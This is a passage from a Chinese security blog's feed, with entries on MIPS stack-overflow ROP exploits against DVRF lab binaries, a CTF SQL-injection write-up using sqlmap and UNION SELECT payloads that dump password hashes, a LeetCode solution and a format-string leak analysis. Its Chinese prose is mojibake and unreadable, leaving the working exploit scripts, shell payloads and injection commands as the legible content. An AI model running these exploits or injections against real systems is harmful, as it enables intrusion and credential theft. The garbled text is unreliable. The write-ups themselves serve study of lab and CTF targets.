&apos;a&apos;*28+&apos;\x90\x03\x40\x00&apos;&quot;`# lscore qemu-mipsel-static stack01 stack01.id0 stack01.idb stack01.tilqemu-mipsel ret2txt.c stack01.c stack01.id1 stack01.nam# whoamiroot ROP chain 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;stdio.h&gt;#include &lt;sys/stat.h&gt;#include &lt;unistd.h&gt;void do_system_0(int code,char *cmd)&#123; char buf[255]; //sleep(1); system(cmd);&#125;void main()&#123; char buf[256]=&#123;0&#125;; char ch; int count = 0; unsigned int fileLen = 0; struct stat fileData; FILE *fp; if(0 == stat(&quot;passwd&quot;,&amp;fileData)) fileLen = fileData.st_size; else return 1; if((fp = fopen(&quot;passwd&quot;,&quot;rb&quot;)) == NULL) &#123; printf(&quot;Cannot open file passwd!n&quot;); exit(1); &#125; ch=fgetc(fp); while(count &lt;= fileLen) &#123; buf[count++] = ch; ch = fgetc(fp); &#125; buf[--count] = &apos;x00&apos;; if(!strcmp(buf,&quot;adminpwd&quot;)) &#123; do_system_0(count,&quot;ls -l&quot;); &#125; else &#123; printf(&quot;you have an invalid password!n&quot;); &#125; fclose(fp);&#125; æ­¤å¤„mainå‡½æ•°æ˜Žæ˜¾æ˜¯éžå¶å­å‡½æ•°ï¼Œæˆ‘ä»¬è¦æƒ³åŠžæ³•è°ƒç”¨do_system_0è¿™ä¸ªå‡½æ•° é‚£å°±è¦æƒ³åŠžæ³•æŽ§åˆ¶$a1å¯„å­˜å™¨ï¼Œé‚£æ ·å°±å¯ä»¥æ‰§è¡Œä»»ä½•å‘½ä»¤ mipsrop.stackfinder() æŸ¥æ‰¾gadget æˆ‘ä»¬é€‰æ‹© 0x00403660 | addiu $a1,$sp,0x58+var_40 | jr 0x58+var_4($sp) è¦åšåˆ°è·³è½¬åˆ°æˆ‘ä»¬çš„gadgetï¼Œéœ€è¦è¦†ç›–mainå‡½æ•°çš„è¿”å›žåœ°å€ å…ˆè®¡ç®—è¦paddingçš„é•¿åº¦ æ­¤æ—¶è®¡ç®—å‡ºæ¥çš„patternæ˜¯412ï¼Œä¼šä¸ä¼šå¤ªé•¿äº†ç‚¹(æ³¨ï¼šåœ¨æˆ‘å‚è€ƒçš„æ–‡ç« ä¸­ä½œè€…è®¡ç®—å‡ºæ¥çš„åç§»å’Œæˆ‘çš„ä¸ä¸€æ ·ï¼Œåˆšå¼€å§‹æˆ‘ä»¥ä¸ºæ˜¯è‡ªå·±è®¡ç®—é”™äº†ï¼Œä½†æ˜¯åŽæ¥è°ƒè¯•åŽè®¤ä¸ºè‡ªå·±å¹¶æ²¡æœ‰ç®—é”™) æŽ¥ä¸‹æ¥æˆ‘å°è¯•å…ˆè¦†ç›–mainå‡½æ•°çš„è¿”å›žåœ°å€ è·³è½¬åˆ°ropçš„ç©ºé—´ï¼Œå†å°†/bin/shå­—ç¬¦ä¸²çš„åœ°å€èµ‹å€¼ç»™$a1 $raè¢«è¦†ç›– f7å•æ­¥ä¸€æ¬¡ï¼Œè·³è½¬åˆ°gadget è€Œä¸”æ­¤æ—¶æ ˆç©ºé—´å·²ç»å¸ƒç½®å¥½äº† addiu $a1, $sp, 0x58+var_40ç›¸å½“äºŽ $a1 = $sp+0x18 æ­¤æ—¶$sp+0x18å­˜æ”¾çš„å°±æ˜¯/bin/shå­—ç¬¦ä¸²çš„åœ°å€ ç„¶è€Œä¸çŸ¥é“ä¸ºä»€ä¹ˆ è¿™ä¸ªé”™è¯¯å°±å¾ˆä¸æ˜Žä¸ç™½äº† é‡æ–°å›žé¡¾äº†ä¸€ä¸‹ã€Šæ­ç§˜å®¶ç”¨è·¯ç”±å™¨0dayæ¼æ´žæŒ–æŽ˜æŠ€æœ¯ã€‹ï¼Œçœ‹åˆ°äº†ä½œè€…å†™çš„ä¸€ä¸ªexp å°†gadgetçš„åœ°å€æ›¿æ¢æˆæˆ‘çš„ï¼Œå¦‚ä¸‹ï¼š 12345678910111213141516171819202122import structcmd = &quot;sh&quot;cmd += &quot;\x00&quot;*(4-len(cmd)%4)shellcode = &quot;A&quot;*0x19cshellcode+= struct.pack(&quot;&gt;L&quot;, 0x00403660) #gadgetåœ°å€ï¼Œä½œè€…å†™çš„æ˜¯&quot;&lt;L&quot;ä½†æ˜¯æˆ‘å°è¯•ä¹‹åŽå‘çŽ°åœ°å€æ˜¯åçš„ï¼Œæ‰€ä»¥æ¢è¿‡æ¥äº†shellcode+=&quot;A&quot;*24shellcode+=cmdshellcode+=&quot;B&quot;*(0x3C-len(cmd))shellcode+=struct.pack(&quot;&gt;L&quot;, 0x00400390) # do_system_0å‡½æ•°åœ°å€shellcode+=&quot;BBBB&quot;print &quot;ok&quot;print &quot;[+] create password file&quot;fw = open(&apos;passwd&apos;, &apos;w&apos;)fw.write(shellcode)fw.close()print &apos;ok&apos; ç”Ÿæˆpasswdæ–‡ä»¶ä¹‹åŽï¼Œ./qemu-mipsel-static -g 1234 ./vuln_systemè¿›è¡Œè°ƒè¯• å½“ç¨‹åºè·³è½¬åˆ°gadgetæ—¶ï¼Œå˜æˆäº†è¿™æ ·ï¼Œ æ­¤æ—¶çœ‹ç»ˆç«¯ï¼š æˆ‘å±…ç„¶æˆåŠŸäº†ï¼Ÿï¼Ÿæ­¤æ—¶å·²ç»æ‹¿åˆ°äº†rootæƒé™ ç¡®å®žæ²¡æœ‰çœ‹é”™ï¼Œé‡æ–°è¿è¡Œä¸€éç¨‹åºï¼Œç¡®å®žæ‹¿åˆ°äº†shellæƒé™ DVRF ç»ƒä¹  è¿™ä¸ªåœ¨attifyOSä¸Šå·²ç»ä¸‹è½½å¥½äº†ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥åŽ»GitHubä¸Šcloneä¸€ä»½ï¼Œä¸€ä¸ªå¾ˆä¸é”™çš„é¡¹ç›® æ¥çœ‹Introçš„stack_bof_01 ç¨‹åºä½äºŽ/home/oit/DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root/pwnable/Intro/ æºç ä½äºŽ/home/oit/DVRF/Pwnable Source/Intro 1234567891011121314151617181920212223242526272829303132#include &lt;string.h&gt;#include &lt;stdio.h&gt;//Simple BoF by b1ack0wl for E1550int main(int argc, char **argv[])&#123;char buf[200] =&quot;\0&quot;;if (argc &lt; 2)&#123;printf(&quot;Usage: stack_bof_01 &lt;argument&gt;\r\n-By b1ack0wl\r\n&quot;);exit(1);&#125;printf(&quot;Welcome to the first BoF exercise!\r\n\r\n&quot;);strcpy(buf, argv[1]);printf(&quot;You entered %s \r\n&quot;, buf);printf(&quot;Try Again\r\n&quot;);return 0x41; // Just so you can see what register is populated for return statements&#125;void dat_shell()&#123;printf(&quot;Congrats! I will now execute /bin/sh\r\n- b1ack0wl\r\n&quot;);system(&quot;/bin/sh -c&quot;);//execve(&quot;/bin/sh&quot;,&quot;-c&quot;,0);//execve(&quot;/bin/sh&quot;, 0, 0);exit(0);&#125; æ˜¾ç„¶ä¹Ÿæ˜¯strcpyå‡½æ•°æ²¡æœ‰é™åˆ¶æ‹·è´çš„é•¿åº¦ è¿è¡Œå®ƒï¼š 123root@ubuntu:/home/oit/DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root# chroot . ./qemu-mipsel-static ./pwnable/Intro/stack_bof_01Usage: stack_bof_01 &lt;argument&gt;-By b1ack0wl æˆ‘ä»¬ç›´æŽ¥è®¡ç®—åç§»åœ°å€ ç”Ÿæˆé•¿åº¦ä¸º200çš„å­—ç¬¦ä¸² 123456/home/oit [oit@ubuntu] [5:50]&gt; python patternOffset.py -s 0x41386741 -l 200[*] Create pattern string contains 200 characters ok![*] No exact matches, looking for likely candidates...[+] Possible match at offset 204 (adjusted another-endian)[+] take time: 0.0042 s é‚£æˆ‘ä»¬è¯•ä¸€è¯•ç›´æŽ¥å¡«å…… 12root@ubuntu:/home/oit/DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root# python -c &quot;print &apos;a&apos;*204+&apos;\x50\x09\x40\x00&apos;&quot; &gt; testroot@ubuntu:/home/oit/DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root# chroot . ./qemu-mipsel-static -g 1234 ./pwnable/Intro/stack_bof_01 &quot;`cat test `&quot; æ­¤æ—¶å·²ç»å°†$raå¯„å­˜å™¨çš„å€¼è¦†ç›–æŽ‰äº† ä½†æ˜¯ åœ¨dat_shellå‡½æ•°ä¸­ æŠ¥é”™äº† æ‰€ä»¥è¿™æ—¶å€™éœ€è¦å€ŸåŠ©gadget ä¹‹å‰å‚è€ƒäº†å‡ ç¯‡æ–‡ç« ï¼Œéƒ½æ˜¯é€šè¿‡æŸ¥æ‰¾libcçš„åŸºåœ°å€æ¥ç¡®è®¤gadgetåœ¨å†…å­˜ä¸­çš„åœ°å€çš„ï¼Œä½†æ˜¯æˆ‘å¼€å§‹è¦gdbè°ƒè¯•çš„æ—¶å€™å¹¶æ²¡æœ‰çœ‹åˆ°libc.so.0çš„åŠ è½½ï¼Œæ‰€ä»¥æˆ‘ä¸€ç›´æ€€ç–‘æ˜¯ä¸æ˜¯æ²¡åŠ è½½ï¼Œç„¶åŽç„¶åŽï¼Œçœ‹åˆ°åŽŸç¨‹åºä¸­æ˜¯æœ‰putså’Œmemsetè¿™äº›å‡½æ•°çš„ï¼Œé‚£æ˜¾ç„¶æ˜¯åŠ è½½äº†çš„ äºŽæ˜¯ä¸‹ä¸€ä¸ªæ–­ç‚¹ç„¶åŽè°ƒè¯• ç»ˆäºŽæ‰¾åˆ°äº†libcçš„åŠ è½½åŸºå€ è¿™æ ·å°±å¥½åŠžäº† python -c &quot;print 'a'*204+'\x20\x1b\x8a\x40'+'\x50\x09\x40\x00'&quot; &gt; test ä¹‹åŽè¿è¡Œ okå·²ç»æˆåŠŸäº†ï¼ï¼ï¼ 1234567root@ubuntu:/home/oit/DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root# chroot . ./qemu-mipsel-static -g 1235 ./pwnable/Intro/stack_bof_01 &quot;`cat test`&quot;Welcome to the first BoF exercise!You entered aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ï¿½@P @Try AgainCongrats! I will now execute /bin/sh- b1ack0wl ä¸è¿‡ä¸ºå•¥ç”¨mipsropæ‰¾ä¸åˆ°è¿™ä¸ªgadgetå‘¢ï¼Ÿ å¾ˆç–‘æƒ‘ ç¡®è®¤libcåŸºå€çš„æ–¹æ³•å¤§æ¦‚æœ‰ï¼š vmmap cat /proc/pid/mapsæŸ¥çœ‹è¿›ç¨‹çš„å†…å­˜åˆ†å¸ƒ åœ¨IDAä¸­æŸ¥æ‰¾åˆ°å‡½æ•°çœŸæ­£åŠ è½½çš„ä½ç½®ï¼Œç„¶åŽè®¡ç®—åç§» å‚è€ƒ è·¯ç”±å™¨æ¼æ´žæŒ–æŽ˜ä¹‹æ ˆæº¢å‡ºå…¥é—¨ï¼ˆä¸€ï¼‰(æ„Ÿè§‰è¿™ç¯‡æ–‡ç« ä¸­ç¬¬äºŒä¸ªç¨‹åºè°ƒè¯•çš„ä¸æ˜¯å¾ˆæ­£ç¡®ï¼Œå› ä¸ºåç§»è®¡ç®—çš„éƒ½ä¸ä¸€æ ·) è·¯ç”±å™¨æ¼æ´žæŒ–æŽ˜ä¹‹æ ˆæº¢å‡ºå…¥é—¨ï¼ˆäºŒï¼‰]]></content>
      <categories>
        <category>IOT</category>
      </categories>
      <tags>
        <tag>MIPS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ä¸¤é“sqlæ³¨å…¥é¢˜]]></title>
    <url>%2F2019%2F07%2F15%2F%E4%B8%A4%E9%81%93sql%E6%B3%A8%E5%85%A5%E9%A2%98%2F</url>
    <content type="text"><![CDATA[åŸºäºŽsqlçš„ç›²æ³¨ ä¹‹å‰ä¸€ç›´æ²¡æœ‰å¥½å¥½åœ°å­¦ä¹ è¿‡sqlmapçš„ä½¿ç”¨æ–¹æ³• å¦‚æžœæ˜¯é’ˆå¯¹postè¡¨å•è¿™ç§æ–¹å¼ å¯ä»¥å°†æŠ“åˆ°çš„åŒ…ä¿å­˜æˆä¸€ä¸ªæ–‡ä»¶ï¼Œç„¶åŽä½¿ç”¨ sqlmap.py -r &quot;post.txt&quot; -p n --dbs å…¶ä¸­-pæ˜¯æŒ‡å®šå‚æ•° sqlmapä¹Ÿå¯ä»¥è‡ªåŠ¨æœå¯»è¡¨å•sqlmap.py -u &quot;url&quot; --forms æŒ‡å®šå‚æ•° è¶æœºå­¦åˆ°äº†ä¸€æŠŠsqlmapä½¿ç”¨ è™½ç„¶è¿™ä¸ªé¢˜ç›®æ˜¯æœ‰ç‚¹ã€‚ã€‚ ä½†æ˜¯æ³¨å…¥ç‚¹çš„åˆ¤æ–­ä¹Ÿæ˜¯å¾ˆé‡è¦çš„ çˆ†åŽç«¯æ•°æ®åº“ python sqlmap.py -u &quot;http://219.153.49.228:40952/new_list.php?id=1&quot; çˆ†æ•°æ®åº“ python sqlmap.py -u &quot;http://219.153.49.228:40952/new_list.php?id=1&quot; --dbs æŒ‡å®šæ•°æ®åº“æŠ¥è¡¨çˆ†è¡¨ python sqlmap.py -u &quot;http://219.153.49.228:40952/new_list.php?id=1&quot; --dbs -D stormgroup --tables æŒ‡å®šæ•°æ®åº“å’Œè¡¨çˆ†å­—æ®µ python sqlmap.py -u &quot;http://219.153.49.228:40952/new_list.php?id=1&quot; --dbs -D stormgroup -T member --columns æŒ‡å®šæ•°æ®åº“ï¼Œè¡¨ï¼Œå­—ç¬¦ç„¶åŽdumpå‡ºæ•°æ® python sqlmap.py -u &quot;http://219.153.49.228:40952/new_list.php?id=1&quot; --dbs -D stormgroup -T member -C password --dump ![member](https://i.imgur.com/iRvoAHX. 123456789Database: stormgroupTable: member[2 entries]+-------+----------------------------------+--------+| name | password | status |+-------+----------------------------------+--------+| mozhe | 3114b433dece9180717f2b7de56b28a3 | 0 || mozhe | b7a0bebf8287c87253fb2958a390346a | 1 |+-------+----------------------------------+--------+ è§£å¯†ä¹‹åŽæ˜¯106370 è¿™æ ·å°±èƒ½ç™»é™†åŽå°äº† å¤ªç¥žå¥‡äº† å‚è€ƒ sqlmapä¹‹(å…­)----POSTç™»é™†æ¡†æ³¨å…¥å®žæˆ˜ SQLæ‰‹å·¥æ³¨å…¥æ¼æ´žæµ‹è¯•(Accessæ•°æ®åº“) è¿™é“é¢˜ç›®å°±æœ‰ç‚¹ç¥žå¥‡äº† çº¯é çŒœ order by 4åˆ¤æ–­æœ‰å¤šå°‘ä¸ªå­—æ®µ ç„¶åŽ new_list.asp?id=1 and exists(select * from admin)åˆ¤æ–­æ˜¯å¦å­˜åœ¨admin æŽ¥ä¸‹æ¥åˆ¤æ–­å›žæ˜¾ä½ç½® /new_list.asp?id=1 union select 1,2,3,4 from admin æŽ¥ä¸‹æ¥çŒœæµ‹å­—æ®µå€¼ and exists (select id from admin) çˆ†å‡ºå­—æ®µå€¼ union select 1,username,passwd,id from admin md5è§£å¯†ä¸€ä¸‹ç™»é™†å°±è¡Œäº† å‚è€ƒ]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Leetcode 2]]></title>
    <url>%2F2019%2F07%2F15%2FLeetcode-2%2F</url>
    <content type="text"><![CDATA[é”™è§£ æ€Žä¹ˆå¿«é€Ÿåœ°å°†é“¾è¡¨å€’ç½® ðŸ˜• æœ€åŽè¿˜æ˜¯å› ä¸ºæº¢å‡ºçš„é—®é¢˜ æ€è·¯ï¼š 12345678910111213141516171819202122â€‹ int k = 0; ListNode temp1 = l1; ListNode temp2 = l2; double resultl1 = 0; double resultl2 = 0; while (temp1 != null) &#123; int tempvalue = temp1.val; resultl1 = resultl1 + tempvalue * Math.pow(10, k); k++; temp1 = temp1.next; &#125; å°±æ˜¯å°†å…¶è½¬åŒ–ä¸ºæ•´æ•°ï¼Œå› ä¸ºé“¾è¡¨çš„ç¬¬ä¸€ä¸ªå…ƒç´ æ˜¯æœ€ä½Žä½ï¼Œä¹‹åŽæ˜¯åä½ï¼Œç™¾ä½ç­‰ å°†å¾—åˆ°çš„ç»“æžœåœ¨è½¬åŒ–ä¸ºé“¾è¡¨ 1234567891011121314151617181920int result = (int) (resultl1 + resultl2);ListNode ans = new ListNode(0); //å…ˆå–ä¸€ä¸ªå¤´èŠ‚ç‚¹ListNode head = ans;int length = Integer.toString(result).length();for (int i = 0; i &lt; length; i++) &#123; ListNode temp = new ListNode(result % 10); head.next = temp; head = head.next; result = result / 10;&#125; è®°å½•ä¸€ä¸‹å°†æ•´æ•°è½¬ä¸ºstringçš„æ“ä½œ Integer.toString(result) Math.powå‡½æ•°çš„è¿”å›žå€¼å¿…é¡»æ˜¯doubleç±»åž‹çš„ ä½†æ˜¯è¿™æ ·ä¼šé¢ä¸´ä¸€ä¸ªé—®é¢˜ï¼Œä¹Ÿå°±æ˜¯æœ€å¼€å›¾ç‰‡çš„é‚£ä¸ªï¼Œæº¢å‡ºï¼ æ­£è§£ çœ‹äº†çœ¼ç­”æ¡ˆï¼Œæ‰æ˜Žç™½è‡ªå·±ä»Žå¼€å§‹å°±æƒ³é”™äº† 1234567891011121314151617181920212223242526272829303132333435363738public ListNode addTwoNumbers(ListNode l1, ListNode l2) &#123; ListNode dummyHead = new ListNode(0); ListNode p = l1, q = l2, curr = dummyHead; int carry = 0; while (p != null || q != null) &#123; int x = (p != null) ? p.val : 0; int y = (q != null) ? q.val : 0; int sum = carry + x + y; carry = sum / 10; curr.next = new ListNode(sum % 10); curr = curr.next; if (p != null) p = p.next; if (q != null) q = q.next; &#125; if (carry &gt; 0) &#123; curr.next = new ListNode(carry); &#125; return dummyHead.next;&#125; æœ€å…³é”®çš„å°±æ˜¯ ==int x = (p != null) ? p.val : 0; int y = (q != null) ? q.val : 0; int sum = carry + x + y; carry = sum / 10; curr.next = new ListNode(sum % 10);== å…¶å®žåªéœ€è¦ä»Žä½Žä½å¼€å§‹ä¸€ä½ä½çš„åŠ ä¸ŠåŽ»å°±å¥½äº†ã€‚ ç„¶åŽå†æŠŠå®ƒä»¬ç»™é“¾èµ·æ¥]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æ ¼å¼åŒ–å­—ç¬¦ä¸²åˆ†æž]]></title>
    <url>%2F2019%2F05%2F04%2F%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[æ ¼å¼åŒ–å­—ç¬¦ä¸² è¿™ä¸ªé¢˜ç›®æ˜¯ctfwikiä¸Šçš„ cä»£ç å¦‚ä¸‹ï¼š 123456789#include &lt;stdio.h&gt;int main() &#123; char s[100]; int a = 1, b = 0x22222222, c = -1; scanf("%s", s); printf("%08x.%08x.%08x.%s\n", a, b, c, s); printf(s); return 0;&#125; ï¼ˆçªç„¶å‘çŽ°è…¾è®¯æ–‡æ¡£å±…ç„¶è¿˜æ”¯æŒä»£ç å¥½å¼ºå•Š æˆ‘ä»¬ç¼–è¯‘ä¸€ä¸‹ï¼š 1gcc -m32 -fno-stack-protector -no-pie -o leakMemory leakMemory.c -g æŠŠä¿æŠ¤æŽªæ–½éƒ½å…³æŽ‰äº† 1234567 % checksec leakMemory [*] '/home/abc/Desktop/pwn/leakMemory/leakMemory' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) å…ˆçœ‹ä¸€ä¸‹å‡ ä¸ªpayload 12345678pwndbg&gt; b printfBreakpoint 1 at 0x8048330pwndbg&gt; rStarting program: /home/abc/Desktop/pwn/leakMemory/leakMemory %08x.%08x.%08xBreakpoint 1, __printf (format=0x8048593 "%08x.%08x.%08x.%s\n") at printf.c:2828printf.c: No such file or directory. åœ¨printfå¤„ä¸‹æ–­ç‚¹ æ­¤æ—¶æ ˆä¸Šçš„å¸ƒå±€å¦‚ä¸‹ 12345600:0000â”‚ esp 0xffffcf9c â€”â–¸ 0x80484ea (main+100) â—‚â€” add esp, 0x2001:0004â”‚ 0xffffcfa0 â€”â–¸ 0x8048593 â—‚â€” and eax, 0x2e783830 /* '%08x.%08x.%08x.%s\n' */02:0008â”‚ 0xffffcfa4 â—‚â€” 0x103:000câ”‚ 0xffffcfa8 â—‚â€” 0x22222222 ('""""')04:0010â”‚ 0xffffcfac â—‚â€” 0xffffffff05:0014â”‚ 0xffffcfb0 â€”â–¸ 0xffffcfc0 â—‚â€” '%08x.%08x.%08x' continueä¸€ä¸‹ï¼š 123456pwndbg&gt; cContinuing.00000001.22222222.ffffffff.%08x.%08x.%08xBreakpoint 1, __printf (format=0xffffcfc0 "%08x.%08x.%08x") at printf.c:2828in printf.c è¾“å‡ºäº†ä¿¡æ¯çš„åŒæ—¶ï¼Œ å‘½ä¸­ç¬¬äºŒä¸ªæ–­ç‚¹ æ­¤æ—¶æ ˆä¸Šçš„å¸ƒå±€å¦‚ä¸‹ï¼š 1234567800:0000â”‚ esp 0xffffcfac â€”â–¸ 0x80484f9 (main+115) â—‚â€” add esp, 0x1001:0004â”‚ 0xffffcfb0 â€”â–¸ 0xffffcfc0 â—‚â€” '%08x.%08x.%08x'... â†“03:000câ”‚ 0xffffcfb8 â€”â–¸ 0xf7fcf410 â€”â–¸ 0x8048278 â—‚â€” inc edi /* 'GLIBC_2.0' */04:0010â”‚ 0xffffcfbc â€”â–¸ 0x804849d (main+23) â—‚â€” add ebx, 0x1b6305:0014â”‚ eax 0xffffcfc0 â—‚â€” '%08x.%08x.%08x'06:0018â”‚ 0xffffcfc4 â—‚â€” '.%08x.%08x'07:001câ”‚ 0xffffcfc8 â—‚â€” 'x.%08x' æ­¤æ—¶printfå‡½æ•°ä¼šæŠŠæ ¼å¼åŒ–å­—ç¬¦ä¸²ä¹‹åŽçš„æ ˆä¸Šçš„ä¿¡æ¯å½“ä½œå‚æ•°æ‰“å°å‡ºæ¥ï¼š contiueä¸€ä¸‹ 123pwndbg&gt; cContinuing.ffffcfc0.f7fcf410.0804849d[Inferior 1 (process 4975) exited normally] ä¹‹å‰æ ˆä¸Šçš„ä¿¡æ¯æ˜¾ç¤ºçš„ä¸å…¨ï¼Œæ ˆçš„å†…å­˜å¦‚ä¸‹ï¼š 123456pwndbg&gt; x/20x 0xffffcfb00xffffcfb0:0xffffcfc0 0xffffcfc0 0xf7fcf410 0x0804849d0xffffcfc0:0x78383025 0x3830252e 0x30252e78 0x000078380xffffcfd0:0x00000000 0x00c30000 0x00000000 0xf7ffd0000xffffcfe0:0x00000000 0x00000000 0x00000000 0x6f984f000xffffcff0:0x00000009 0xffffd2a4 0xf7e094a9 0xf7fb4748 0xffffcfb0 æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„åœ°å€ï¼Œ æˆ‘ä»¬çœ‹åˆ°æ­¤æ—¶printfå‡½æ•°å°†0xffffcfc0 0xf7fcf410 0x0804849d éƒ½æ‰“å°å‡ºæ¥äº†ï¼Œ ä¹Ÿå°±æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¹‹åŽçš„ä¸‰ä¸ªä½ç½®çš„ä¿¡æ¯ æˆ‘ä»¬é€šè¿‡è¿™ç§æ–¹å¼æ³„éœ²æ ˆçš„ä¿¡æ¯ï¼Œä½†æ˜¯ä¹Ÿå¯ä»¥ç›´æŽ¥åŽ»å–å¾—æ ˆä¸­è¢«è§†ä¸ºç¬¬n+1ä¸ªå‚æ•°çš„å€¼ è‡³äºŽä¸ºä»€ä¹ˆæ˜¯ç¬¬n+1, è¿™æ˜¯å› ä¸ºæ ¼å¼åŒ–å­—ç¬¦ä¸²æ˜¯ç¬¬ä¸€ä¸ªå‚æ•° æ¯”å¦‚ é€šè¿‡ %3$x(è¿™ä¸ªçš„åŽŸç†æ˜¯å•¥ï¼Ÿä¸ºä»€ä¹ˆè¦åŠ $ç¬¦å·) æˆ‘ä»¬å¯ä»¥æ³„éœ²æ ˆä¸Šè¢«è§†ä¸ºç¬¬4ä¸ªå‚æ•°çš„å€¼ æ ˆå¸ƒå±€å¦‚ä¸‹ï¼š(å·¦è¾¹çš„ä¸€åˆ—æ˜¯æ ˆåœ°å€ï¼Œä¹Ÿå°±æ˜¯å†…å­˜çš„åœ°å€ï¼Œç®­å¤´ä»£è¡¨äº†è¿™ä¸ªå†…å­˜å•å…ƒå­˜å‚¨çš„æ•°æ®ï¼Œå¦‚æžœæ˜¯æŒ‡é’ˆè¿˜ä¼šè¿›ä¸€æ­¥æŒ‡ç¤º) 1234567800:0000â”‚ esp 0xffffcfac â€”â–¸ 0x80484f9 (main+115) â—‚â€” add esp, 0x1001:0004â”‚ 0xffffcfb0 â€”â–¸ 0xffffcfc0 â—‚â€” '%3$x'... â†“(è¿™é‡Œæ˜¯çœç•¥å·ï¼Œæ˜¯ä¸æ˜¯å°±æ˜¯ç›´æŽ¥æŒ‡å‘äº†ï¼Œä¸­é—´é‚£ä¸ªå°±è¢«è·³è¿‡äº†)03:000câ”‚ 0xffffcfb8 â€”â–¸ 0xf7fcf410 â€”â–¸ 0x8048278 â—‚â€” inc edi /* 'GLIBC_2.0' */04:0010â”‚ 0xffffcfbc â€”â–¸ 0x804849d (main+23) â—‚â€” add ebx, 0x1b6305:0014â”‚ eax 0xffffcfc0 â—‚â€” '%3$x'06:0018â”‚ 0xffffcfc4 â—‚â€” 0x007:001câ”‚ 0xffffcfc8 â€”â–¸ 0xf7ffd940 â—‚â€” 0x0 åŒæ ·çœ‹ä¸æ¸…ï¼Œ è¿˜æ˜¯ç›´æŽ¥æ‰“å°å†…å­˜ä¿¡æ¯å§(xå‘½ä»¤çš„ç”¨æ³•ï¼Œè¿™é‡Œæ˜¾ç¤ºçš„æ˜¯å†…å­˜åœ°å€ä»Ž0xffffcfb0å¼€å§‹çš„ï¼Œå› ä¸ºå†…å­˜æ˜¯æŒ‰ç…§å­—èŠ‚ç¼–å€çš„ï¼Œæ‰€ä»¥ä¸€è¡Œæ­£å¥½æ˜¯16ä¸ªå­—èŠ‚å†…å­˜åœ°å€å°±æ˜¯åŠ 10) 123456pwndbg&gt; x/20x 0xffffcfb00xffffcfb0:0xffffcfc0 0xffffcfc0 0xf7fcf410 0x0804849d (0xffffcfb0è¿™ä¸ªå†…å­˜å•å…ƒæŒ‡å‘äº†0xffffcfc0)0xffffcfc0:0x78243325 0x00000000 0xf7ffd940 0x000000c2 (çœ‹å†…å­˜å•å…ƒ0xffffcfc0å­˜æ”¾çš„å†…å®¹å°±æ˜¯x$3%)0xffffcfd0:0x00000000 0x00c30000 0x00000000 0xf7ffd0000xffffcfe0:0x00000000 0x00000000 0x00000000 0xd6a577000xffffcff0:0x00000009 0xffffd2a4 0xf7e094a9 0xf7fb4748 çŒœçŒœè¿™æ—¶å€™æ‰“å°çš„ä¿¡æ¯æ˜¯å•¥ï¼Ÿ ç­”æ¡ˆæ˜¯æ ˆä¸Šè¢«è§†ä¸ºç¬¬å››ä¸ªå‚æ•°çš„ä¿¡æ¯ï¼š 0x0804849d åŒæ ·çš„æˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡%sæ¥å¾—åˆ°å­—ç¬¦ä¸²çš„ä¿¡æ¯ æ ˆå¸ƒå±€å¦‚ä¸‹ï¼š 1234567800:0000â”‚ esp 0xffffcfac â€”â–¸ 0x80484f9 (main+115) â—‚â€” add esp, 0x1001:0004â”‚ 0xffffcfb0 â€”â–¸ 0xffffcfc0 â—‚â€” 0x7325 /* '%s' */... â†“03:000câ”‚ 0xffffcfb8 â€”â–¸ 0xf7fcf410 â€”â–¸ 0x8048278 â—‚â€” inc edi /* 'GLIBC_2.0' */04:0010â”‚ 0xffffcfbc â€”â–¸ 0x804849d (main+23) â—‚â€” add ebx, 0x1b6305:0014â”‚ eax 0xffffcfc0 â—‚â€” 0x7325 /* '%s' */06:0018â”‚ 0xffffcfc4 â—‚â€” 0x107:001câ”‚ 0xffffcfc8 â€”â–¸ 0xf7ffd940 â—‚â€” 0x0 è¿˜æ˜¯çœ‹ä¸æ¸…ï¼Œç›´æŽ¥çœ‹å†…å­˜å§(md åžƒåœ¾pwndbg) 123456pwndbg&gt; x/20x 0xffffcfb00xffffcfb0:0xffffcfc0 0xffffcfc0 0xf7fcf410 0x0804849d0xffffcfc0:0x00007325 0x00000001 0xf7ffd940 0x000000c20xffffcfd0:0x00000000 0x00c30000 0x00000000 0xf7ffd0000xffffcfe0:0x00000000 0x00000000 0x00000000 0xf1ae29000xffffcff0:0x00000009 0xffffd2a4 0xf7e094a9 0xf7fb4748 è¿™ä¸ªæ—¶å€™ä¼šç›´æŽ¥å°† 0xffffcfc0 å¯¹åº”çš„å­—ç¬¦ä¸²æ‰“å°å‡ºæ¥ ç»“æžœè‡ªç„¶å°±æ˜¯ %säº† å¦‚æžœæˆ‘ä»¬è¾“å…¥%2$s, è¿™ä¸ªæ—¶å€™å°±å¾ˆæœ‰è¶£äº†ï¼Œ æŒ‰ç…§é“ç†ç¨‹åºä¼šå°† 0xf7fcf410 å¯¹åº”åœ°å€çš„å½“ä½œå­—ç¬¦ä¸²æ‰“å°å‡ºæ¥ï¼Œ å¯æ˜¯å¦‚æžœè¿™ä¸ªåœ°å€æ— 